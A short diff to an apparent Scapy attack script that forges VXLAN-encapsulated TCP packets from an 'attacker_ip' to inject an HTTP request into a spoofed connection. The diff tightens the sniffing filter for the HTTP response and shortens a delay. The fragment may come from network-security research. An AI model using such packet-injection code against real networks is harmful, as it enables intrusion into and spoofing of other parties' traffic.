@@ -118,7 +118,7 @@ def get_http_packet(packet):
 
 #Sniff HTTP Response Function
 def sniff_http_response_thread():
-    sniff(filter = "tcp port " + str(http_port) + " and tcp[11] == 58 and greater 100", prn=get_http_packet, count = 3)  # + " and tcp[tcpflags] & tcp-ack == 58"
+    sniff(filter = "tcp port " + str(http_port) + " and tcp[11] == 58 and tcp[13] == 24 and greater 100", prn=get_http_packet, count = 1)  # + " and tcp[tcpflags] & tcp-ack == 58"
     return
 
 #create sniff thread
@@ -135,7 +135,7 @@ time.sleep(1)
 # send HTTP Request
 send(VXLAN / IP(src=attacker_ip,dst=dest) / TCP(dport=http_port, sport=syn_ack_dport,seq=syn_ack_ack, ack=syn_ack_seq + 1, flags='P''A') / getStr)
 
-time.sleep(2)
+time.sleep(1)
 
 #http_layer = http_answer.getlayer(http.HTTPResponse)
 #ip_layer = http_answer.getlayer(IP)
